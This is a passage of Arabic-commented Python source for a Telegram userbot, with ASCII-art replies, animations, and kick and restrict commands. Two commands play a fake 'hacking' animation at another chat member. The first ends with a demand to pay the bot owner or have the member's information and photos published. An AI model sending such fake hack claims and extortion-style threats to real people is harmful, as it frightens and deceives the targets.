لمعرفة الحالة او الايقاف
"""    
    await event.edit(m26_text)    
    
async def fake_hack(client, event):
    """عرض أنيميشن اختراق وهمي عند الرد على رسالة"""
    if event.reply_to_msg_id:
        reply_message = await event.get_reply_message()
        idd = reply_message.sender_id

        if idd == 7915484613:
            await event.edit("**᯽︙ عـذرا لا استـطيع اخـتراق مـطوري اعـتذر او سيقـوم بتهـكيرك**")
            return
        
        event = await event.edit("يتـم الاختـراق ..")

        me = await client.get_me()  # ✅ إصلاح الخطأ هنا
        animation_chars = [
            "᯽︙ تـم الربـط بسـيرفرات الـتهكير الخـاصة",
            "تـم تحـديد الضحـية",
            "**تهكيـر**... 0%\n▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ ",
            "**تهكيـر**... 4%\n█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ ",
            "**تهكيـر**... 8%\n██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ ",
            "**تهكيـر**... 20%\n█████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ ",
            "**تهكيـر**... 36%\n█████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ ",
            "**تهكيـر**... 52%\n█████████████▒▒▒▒▒▒▒▒▒▒▒▒ ",
            "**تهكيـر**... 84%\n█████████████████████▒▒▒▒ ",
            "**تهكيـر**... 100%\n████████████████████████ ",
            f"᯽︙ ** تـم اخـتراق الضـحية**..\n\nقـم بالـدفع الى {me.first_name} لعـدم نشـر معلوماتك وصـورك",
        ]
        
        for i in range(len(animation_chars)):
            await asyncio.sleep(3)
            await event.edit(animation_chars[i])
    else:
        await event.edit("᯽︙ لم يتـم التعـرف على المستـخدم")

# تسجيل الأمر مع الكلاينت
@client.on(events.NewMessage(pattern=".تهكير$"))
async def _(event):
    await fake_hack(client, event)

async def fake_hack2(client, event):
    """عرض أنيميشن اختراق وهمي مع إظهار اسم المهاجم"""
    animation_interval = 3

    await event.edit("**جارِ اختراق الضحية..**")

    animation_chars = [
        "**جار تحديد الضحية...**",
        "**تم تحديد الضحية بنجاح ✓**",
        "`يتم الاختراق... 0%\n▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ `",
        "`يتم الاختراق... 4%\n█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ `",
        "`يتم الاختراق... 8%\n██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ `",    
        "`يتم الاختراق... 20%\n█████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ `",
        "`يتم الاختراق... 36%\n█████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ `",
        "`يتم الاختراق... 52%\n█████████████▒▒▒▒▒▒▒▒▒▒▒▒ `",
        "`يتم الاختراق... 84%\n█████████████████████▒▒▒▒ `",
        "`يتم الاختراق... 100%\n████████████████████████ `",
    ]
  
    for i in range(len(animation_chars)):
        await asyncio.sleep(animation_interval)
        await event.edit(animation_chars[i])

    # ✅ جلب اسم المهاجم
    me = await client.get_me()
    attacker_name = me.first_name

    # ✅ إضافة اسم المهاجم في النهاية
    final_message = f"**تم رفع معلومات الضحية...**\n\n**المخترق:** {attacker_name}\nسيتم ربط المعلومات بسيرفرات التهكير الخاصة.."
    await asyncio.sleep(2)
    await event.edit(final_message)

# تسجيل الأمر مع الكلاينت
@client.on(events.NewMessage(pattern=".اختراق$"))
async def _(event):
    await fake_hack2(client, event)

@client.on(events.NewMessage(from_users='me', pattern='.غبي'))
async def dumb_brain(event):
    try:
        
        await event.delete()

        
        message_texts = [
            "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n🧠         <(^_^ <)🗑",
            "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n🧠       <(^_^ <)  🗑",
            "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n🧠     <(^_^ <)  🗑",
            "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n🧠   <(^_^ <)  🗑",
            "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n🧠 <(^_^ <)  🗑",
            "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n  (> ^_^)>🧠       🗑",
            "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n    (> ^_^)>🧠     🗑",
            "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n        (> ^_^)>🧠 🗑",
            "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n           (> ^_^)>🗑",
            "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n           <(^_^ <)🗑"
        ]

        
        message = await client.send_message(event.chat_id, message_texts[0])

        
        for text in message_texts[1:]:
            await asyncio.sleep(1)
            await message.edit(text)
            
    except Exception as e:
        await client.send_message(event.chat_id, f"⚠️ حدث خطأ: {e}")

@client.on(events.NewMessage(from_users='me', pattern='.ترحيب'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄───
───█▒▒░░░░░░░░░▒▒█───
────█░░█░░░░░█░░█────
─▄▄──█░░░▀█▀░░░█──▄▄─
█░░█─▀▄░░░░░░░▄▀─█░░█
█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
█░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
█░░║║║╠─║─║─║║║║║╠─░░█
█░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.نادم'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
⣿⣿⣿⣿⣿⣿⡿⠿⠛⠋⠉⡉⣉⡛⣛⠿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡿⠋⠁⠄⠄⠄⠄⠄⢀⣸⣿⣿⡿⠿⡯⢙⠿⣿⣿⣿⣿
⣿⣿⡿⠄⠄⠄⠄⠄⡀⡀⠄⢀⣀⣉⣉⣉⠁⠐⣶⣶⣿⣿⣿⣿
⣿⣿⡇⠄⠄⠄⠄⠁⣿⣿⣀⠈⠿⢟⡛⠛⣿⠛⠛⣿⣿⣿⣿⣿
⣿⣿⡆⠄⠄⠄⠄⠄⠈⠁⠰⣄⣴⡬⢵⣴⣿⣤⣽⣿⣿⣿⣿⣿
⣿⣿⡇⠄⢀⢄⡀⠄⠄⠄⠄⡉⠻⣿⡿⠁⠘⠛⡿⣿⣿⣿⣿⣿
⣿⡿⠃⠄⠄⠈⠻⠄⠄⠄⠄⢘⣧⣀⠾⠿⠶⠦⢳⣿⣿⣿⣿⣿
⣿⣶⣤⡀⢀⡀⠄⠄⠄⠄⠄⠄⠻⢣⣶⡒⠶⢤⢾⣿⣿⣿⣿⣿
⣿⡿⠋⠄⢘⣿⣦⡀⠄⠄⠄⠄⠄⠉⠛⠻⠻⠺⣼⣿⠟⠛⠿⣿
⠋⠁⠄⠄⠄⢻⣿⣿⣶⣄⡀⠄⠄⠄⠄⢀⣤⣾⣿⡀⠄⠄⠄⢹
⠄⠄⠄⠄⠄⠄⢻⣿⣿⣿⣷⡤⠄⠰⡆⠄⠄⠈⠛⢦⣀⡀⡀⠄
⠄⠄⠄⠄⠄⠄⠈⢿⣿⠟⡋⠄⠄⠄⢣⠄⠄⠄⠄⠄⠈⠹⣿⣀
⠄⠄⠄⠄⠄⠄⠄⠘⣷⣿⣿⣷⠄⠄⢺⣇⠄⠄⠄⠄⠄⠄⠸⣿
⠄⠄⠄⠄⠄⠄⠄⠄⠹⣿⣿⡇⠄⠄⠸⣿⡄⠄⠈⠁⠄⠄⠄⣿
⠄⠄⠄⠄⠄⠄⠄⠄⠄⢻⣿⡇⠄⠄⠄⢹⣧⠄⠄⠄⠄⠄⠄⠘
"""
    await event.reply(welcome_message)
    
@client.on(events.NewMessage(pattern=f"\.قنبلة$", outgoing=True))
async def bombs(event):
    if event.fwd_from:
        return
    await event.edit("▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n")
    await asyncio.sleep(0.5)
    await event.edit("💣💣💣💣 \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n")
    await asyncio.sleep(0.5)
    await event.edit("▪️▪️▪️▪️ \n💣💣💣💣 \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n")
    await asyncio.sleep(0.5)
    await event.edit("▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n💣💣💣💣 \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n")
    await asyncio.sleep(0.5)
    await event.edit("▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n💣💣💣💣 \n▪️▪️▪️▪️ \n")
    await asyncio.sleep(0.5)
    await event.edit("▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n💣💣💣💣 \n")
    await asyncio.sleep(1)
    await event.edit("▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n💥💥💥💥 \n")
    await asyncio.sleep(0.5)
    await event.edit("▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n💥💥💥💥 \n💥💥💥💥 \n")
    await asyncio.sleep(0.5)
    await event.edit("▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n😵😵😵😵 \n")
    await asyncio.sleep(0.5)
    await event.edit("`RIP PLOXXX......`")
    await asyncio.sleep(2)
   
@client.on(events.NewMessage(from_users='me', pattern='.سبونج بوب'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
   ╱▔▔▔▔▔▔▔▔▔▔▔▏
╱╭▏╮╭┻┻╮╭┻┻╮ ╭▏ 
╮╰▏╯┃╭╮┃┃╭╮┃ ╰▏ 
╯┈▏┈┗┻┻┛┗┻┻┻╮ ▏ 
╭╮▏╮┈┈┈┈┏━━━╯ ▏
╰╯▏╯╰┳┳┳┳┳┳╯ ╭▏
┈╭▏╭╮┃┗┛┗┛┃┈ ╰▏ 
┈╰▏╰╯╰━━━━╯┈┈ ▏I'm سبـونـج بــوب
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.صدمه'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
⣿⣿⣿⡇⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡇⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡇⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡇⠄⣿⣿⣿⡿⠋⣉⣉⣉⡙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⠃⠄⠹⠟⣡⣶⢟⣛⣛⡻⢿⣦⣩⣤⣬⡉⢻⣿⣿⣿⣿
⣿⣿⣿⠄⢀⢤⣾⣿⣿⣿⡿⠿⠿⠿⢮⡃⣛⡻⢿⠈⣿⣿⣿⣿
⣿⡟⢡⣴⣯⣿⣿⣿⠤⣤⣭⣶⣶⣶⣮⣔⡈⠛⢓⠦⠈⢻⣿⣿
⠏⣠⣿⣿⣿⣿⣿⣿⣯⡪⢛⠿⢿⣿⣿⣿⡿⣼⣿⣿⣮⣄⠙⣿
⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣾⡭⠴⣶⣶⣽⣽⣛⡿⠿⠿⠇⣿
⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣷⣝⣛⢛⢋⣥⣴⣿⣿
⣿⣿⣿⣿⣿⢿⠱⣿⣛⠾⣭⣛⡿⢿⣿⣿⣿⣿⣿⡀⣿⣿⣿⣿
 ⠽⡻⢿⣮⣽⣷⣶⣯⣽⣳⠮⣽⣟⣲⠯⢭⣿⣛⡇⣿⣿⣿⣿
⠄⠄⠈⠑⠊⠉⠟⣻⠿⣿⣿⣿⣷⣾⣭⣿⠷⠶⠂⣴⣿⣿⣿⣿
⠄⠄⠄⠄⠄⠄⠄⠁⠙⠒⠙⠯⠍⠙⢉⣡⣶⣿⣿⣿⣿⣿⣿⣿
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿
"""
    await event.reply(welcome_message)
    

@client.on(events.NewMessage(from_users='me', pattern='.طائره'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
    🔲 ▬▬▬.◙.▬▬▬ 🔳
            ═▂▄▄▓▄▄▂ 
           ◢◤    █▀▀████▄▄▄▄◢◤ 
           █▄ █ █▄ ███▀▀▀▀▀▀▀╬
           ◥█████◤ 
             ══╩══╩══ 
                      ╬═╬ 
                      ╬═╬     
                      ╬═╬ ☻/ 
                      ╬═╬/▌ 
                      ╬═╬//\"""
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.حب'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
┳┻┳┻╭━━━━╮╱▔▔▔╲
┻┳┻┳┃╯╯╭━┫▏╰╰╰▕
┳┻┳┻┃╯╯┃▔╰┓▔▂▔▕╮
┻┳┻┳╰╮╯┃┈╰┫╰━╯┏╯
┳┻┳┻┏╯╯┃╭━╯┳━┳╯
┻┳┻┳╰━┳╯▔╲╱▔╭╮▔╲
┳┻┳┻┳┻┃┈╲┈╲╱╭╯╮▕
┻┳┻┳┻┳┃┈▕╲▂╱┈╭╯╱
┳┻┳┻┳┻┃'''┈┃┈┃┈'''╰╯
┻┳┻┳┻┏╯▔'''╰┓┣━┳┫
┳┻┳┻┳╰┳┳┳'''╯┃┈┃┃
┻┳┻┳┻┳┃┃┃┈'''┃┈┃┃
┳┻┳┻┳┻┃┃┃'''┊┃┈┃┃
┻┳┻┳┻┳┃┃┃┈'''┃┈┃┃
┳┻┳┻┳┻┣╋┫'''┊┣━╋┫
┻┳┻┳┻╭╯╰╰-╭╯━╯.''╰╮
"**I Love You 💕** 
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.وحش'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
▄███████▄
█▄█████▄█
█▼▼▼▼▼█
██________█▌
█▲▲▲▲▲█
█████████
_████"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.السورس'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
المطور @X_54P

قناه السورس @S21S6

مجموعة الدعم @e_u0e
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.قاتل'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
_/﹋\_
(҂`_´)
<,︻╦╤─ ҉ - - - 🤯
_/﹋\_
"""
@client.on(events.NewMessage(from_users='me', pattern='.احبك'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
❤️ I • L O V E • Y O U
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.مسدس'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
░▐█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█▄
░███████████████████████ 
░▓▓▓▓▓▓▓▓▓▓▓▓██▓▓▓▓▓▓▓▓◤ 
░▀░▐▓▓▓▓▓▓▌▀█░░░█▀░
░░░▓▓▓▓▓▓█▄▄▄▄▄█▀░░
░░█▓▓▓▓▓▌░░░░░░░░░░
░▐█▓▓▓▓▓░░░░░░░░░░░
░▐██████▌░░░░░░░░░░
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.كلب'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
╥━━━━━━━━╭━━╮━━┳
╢╭╮╭━━━━━┫┃▋▋━▅┣
╢┃╰┫┈┈┈┈┈┃┃┈┈╰┫┣
╢╰━┫┈┈┈┈┈╰╯╰┳━╯┣
╢┊┊┃┏┳┳━━┓┏┳┫┊┊┣
╨━━┗┛┗┛━━┗┛┗┛━━┻
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.هلو'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
╔┓┏╦━╦┓╔┓╔━━╗
║┗┛║┗╣┃║┃║X X║
║┏┓║┏╣┗╣┗╣╰╯║
╚┛┗╩━╩━╩━╩━━╝
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.ثعبان'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
░░░░▓
░░░▓▓
░░█▓▓█
░██▓▓██
░░██▓▓██
░░░██▓▓██
░░░░██▓▓██
░░░░░██▓▓██
░░░░██▓▓██
░░░██▓▓██
░░██▓▓██
░██▓▓██
░░██▓▓██
░░░██▓▓██
░░░░██▓▓██
░░░░░██▓▓██
░░░░██▓▓██
░░░██▓▓██
░░██▓▓██
░██▓▓██
░░██▓▓██
░░░██▓▓██
░░░░██▓▓██
░░░░░██▓▓██
░░░░██▓▓██
░░░██▓▓██
░░██▓▓██
░██▓▓██
░░██▓▓██
░░░██▓▓██
░░░░██▓▓██
░░░░░██▓▓██
░░░░██▓▓██
░░░██▓▓██
░░██▓▓██
░██▓▓██
░░██▓▓██
░░░██▓▓██
░░░░██▓▓██
░░░░░██▓▓██
░░░░██▓▓██
░░░██▓▓██
░░██▓▓██
░██▓▓██
░░██▓▓██
░░░██▓▓██
░░░░██▓▓██
░░░░░██▓▓██
░░░░██▓▓██
░░░██▓▓██
░░██▓▓██
░██▓▓██
░░██▓▓██
░░░██▓▓██
░░░░██▓▓██
░░░░░██▓▓██
░░░░██▓▓██
░░░██▓▓██
░░██▓▓██
░██▓▓██
░░██▓▓██
░░░██▓▓██
░░░░██▓▓██
░░░░░██▓▓██
░░░░██▓▓██
░░░██▓▓██
░░██▓▓██
░░██▓▓██
░░██▓▓██
░░██▓▓██
░░██▓▓██
░░██▓▓██
░░░██▓▓███
░░░░██▓▓████
░░░░░██▓▓█████
░░░░░░██▓▓██████
░░░░░░███▓▓███████
░░░░░████▓▓████████
░░░░█████▓▓█████████
░░░█████░░░█████●███
░░████░░░░░░░███████
░░███░░░░░░░░░██████
░░██░          ░████
░░░░░░░░░░░░░░░░███
░░░░░░░░░░░░░░░░░░░
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.دس لايك'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
███████▄▄███████████▄
▓▓▓▓▓▓█░░░░░░░░░░░░░░█
▓▓▓▓▓▓█░░░░░░░░░░░░░░█
▓▓▓▓▓▓█░░░░░░░░░░░░░░█
▓▓▓▓▓▓█░░░░░░░░░░░░░░█
▓▓▓▓▓▓█░░░░░░░░░░░░░░█
▓▓▓▓▓▓███░░░░░░░░░░░░█
██████▀░░█░░░░██████▀
░░░░░░░░░█░░░░█
░░░░░░░░░░█░░░█
░░░░░░░░░░░█░░█
░░░░░░░░░░░█░░█
░░░░░░░░░░░░▀▀
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.اشارة'))
async def signal_animation(event):
    await event.delete()
    
    sequences = [
        "▁ ▂ ▄ ▅ ▆ ▇ █",
        "▁ ▂ ▄ ▅ ▆ ▇ ▒",
        "▁ ▂ ▄ ▅ ▆ ▒ ▒",
        "▁ ▂ ▄ ▅ ▒ ▒ ▒",
        "▁ ▂ ▄ ▒ ▒ ▒ ▒",
        "▁ ▂ ▒ ▒ ▒ ▒ ▒",
        "▁ ▒ ▒ ▒ ▒ ▒ ▒",
        "▒ ▒ ▒ ▒ ▒ ▒ ▒",
        "▒ ▒ ▒ ▒ ▒ ▒ ▁",
        "▒ ▒ ▒ ▒ ▒ ▂ ▁",
        "▒ ▒ ▒ ▒ ▄ ▂ ▁",
        "▒ ▒ ▒ ▅ ▄ ▂ ▁",
        "▒ ▒ ▆ ▅ ▄ ▂ ▁",
        "▒ ▇ ▆ ▅ ▄ ▂ ▁",
        "█ ▇ ▆ ▅ ▄ ▂ ▁"
    ]
    
    try:
        
        message = await event.reply(sequences[0])
        
        
        for seq in sequences[1:]:
            await asyncio.sleep(1)  
            await message.edit(seq)
    
        
        
        
        
    except Exception as e:
        await event.reply(f"⚠️ حدث خطأ أثناء تنفيذ أمر الإشارة: {e}")

@client.on(events.NewMessage(from_users='me', pattern='.طرد'))
async def kick_user(event):
    try:
        
        if event.is_reply:
            reply_message = await event.get_reply_message()
            user_id = reply_message.sender_id
        else:
            
            command, username = event.raw_text.split(' ', 1)
            if username.startswith('@'):
                username = username[1:]  
            user = await client.get_entity(username)
            user_id = user.id
        
        
        try:
            await client(EditBannedRequest(
                event.chat_id,
                user_id,
                ChatBannedRights(until_date=None, view_messages=True)  
            ))
            await event.edit(f"**⎙ تم طرد المستخدم بنجاح.**")
        except UserAdminInvalidError:
            await event.edit("**⎙ لا يمكن طرد المشرفين.**")
        except ChatAdminRequiredError:
            await event.edit("**⎙ لا أملك صلاحيات طرد الأعضاء.**")
        except Exception as e:
            await event.edit(f"*-⎙ حدث خطأ أثناء محاولة الطرد: {e}**")
    except ValueError:
        await event.edit("**⎙ استخدم الصيغة الصحيحة: .طرد @username أو بالرد على رسالة.**")

restricted_users_file = 'restricted_users.pkl'  


if os.path.exists(restricted_users_file):
    with open(restricted_users_file, 'rb') as f:
        restricted_users = pickle.load(f)
else:
    restricted_users = set()


@client.on(events.NewMessage(pattern=r'^.تقييد(?:\s+@?\w+)?$'))
async def restrict_user(event):
    if event.is_reply:  
        replied_msg = await event.get_reply_message()
        user_id = replied_msg.sender_id
        try:
            user = await event.get_reply_message().get_sender()
            user_name = user.first_name
            if user.last_name:
                user_name += f" {user.last_name}"
            if user.username:
                user_name += f" (@{user.username})"
        except Exception:
            user_name = "غير معروف"
    else:  
        try:
            args = event.raw_text.split()
            if len(args) < 2:
                await event.reply("**⎙ يرجى الرد على رسالة المستخدم أو كتابة اليوزر الخاص به.**")
                return
            username = args[1]
            if username.startswith('@'):
                username = username[1:]
            user = await client.get_entity(username)
            user_id = user.id
            user_name = user.first_name
            if user.last_name:
                user_name += f" {user.last_name}"
            if user.username:
                user_name += f" (@{user.username})"
        except (IndexError, ValueError):
            await event.edit("**⎙ يرجى الرد على رسالة المستخدم أو كتابة اليوزر الخاص به بشكل صحيح.**")
            return
        except Exception as e:
            await event.edit(f"**⎙ لم يتم العثور على المستخدم: {e}**")
            return

    if user_id not in restricted_users:
        restricted_users.add(user_id)
        rights = ChatBannedRights(
            until_date=None,  
            send_messages=True  
        )
        try:
            await client(EditBannedRequest(event.chat_id, user_id, rights))
            await event.edit(f"**⎙ المستخدم: {user_name}\n ⎙ تم تقيده**")
            
            
            with open(restricted_users_file, 'wb') as f:
                pickle.dump(restricted_users, f)
        except Exception as e:
            await event.edit(f"**⎙ حدث خطأ أثناء تقييد المستخدم: {e}**")
    else:
        await event.edit("**⎙ هذا المستخدم مقيد بالفعل.**")


@client.on(events.NewMessage(pattern=r'^.الغاء التقييد(?:\s+@?\w+)?$'))
async def unrestrict_user(event):
    if event.is_reply:
        replied_msg = await event.get_reply_message()
        user_id = replied_msg.sender_id
        try:
            user = await event.get_reply_message().get_sender()
            user_name = user.first_name
            if user.last_name:
                user_name += f" {user.last_name}"
            if user.username:
                user_name += f" (@{user.username})"
        except Exception:
            user_name = "غير معروف"
    else:
        try:
            args = event.raw_text.split()
            if len(args) < 2:
                await event.edit("**⎙ يرجى الرد على رسالة المستخدم أو كتابة اليوزر الخاص به.**")
                return
            username = args[1]
            if username.startswith('@'):
                username = username[1:]
            user = await client.get_entity(username)
            user_id = user.id
            user_name = user.first_name
            if user.last_name:
                user_name += f" {user.last_name}"
            if user.username:
                user_name += f" (@{user.username})"
        except (IndexError, ValueError):
            await event.edit("**⎙ يرجى الرد على رسالة المستخدم أو كتابة اليوزر الخاص به بشكل صحيح.**")
            return
        except Exception as e:
            await event.edit(f"**⎙ لم يتم العثور على المستخدم: {e}**")
            return

    if user_id in restricted_users:
        restricted_users.remove(user_id)
        rights = ChatBannedRights(
            until_date=None,
            send_messages=False  
        )
        try:
            await client(EditBannedRequest(event.chat_id, user_id, rights))
            await event.edit(f"**⎉╎ المستخدم: {user_name}\n ⎉╎ تم تقييد المستخدم")
            
            
            with open(restricted_users_file, 'wb') as f:
                pickle.dump(restricted_users, f)
        except Exception as e:
            await event.edit(f"**⎙ حدث خطأ أثناء إلغاء تقييد المستخدم: {e}**")
    else:
        await event.edit("**⎙ هذا المستخدم غير مقيد.**")


@client.on(events.NewMessage(pattern=r'^.المقيدين$'))
async def list_restricted_users(event):
    if restricted_users:
        user_list = ""
        for user_id in restricted_users:
            try:
                user = await client.get_entity(user_id)
                user_name = user.first_name
                if user.last_name:
                    user_name += f" {user.last_name}"
                if user.username:
                    user_name += f" (@{user.username})"
                else:
                    user_name += ""
                user_list += f"- {user_name}\n"
            except Exception:
                user_list += f"- ID: {user_id} (غير متاح)\n"
        
        
        if len(user_list) > 4000:
            
            for i in range(0, len(user_list), 4000):
                await event.reply(user_list[i:i+4000])
        else:
            await event.edit(f"**⎙ قائمة المستخدمين المقيدين:\n{user_list}**")
    else:
        await event.edit("**⎙ لا يوجد مستخدمون مقيدون حتى الآن**")

@client.on(events.NewMessage(incoming=True))
async def delete_muted_user_messages(event):
    if event.is_private and event.chat_id in muted_users:
        await client.delete_messages(event.chat_id, [event.id])
    

async def main():
    await client.start()
    await update_username()

with client:
    client.loop.run_until_complete(main())
    
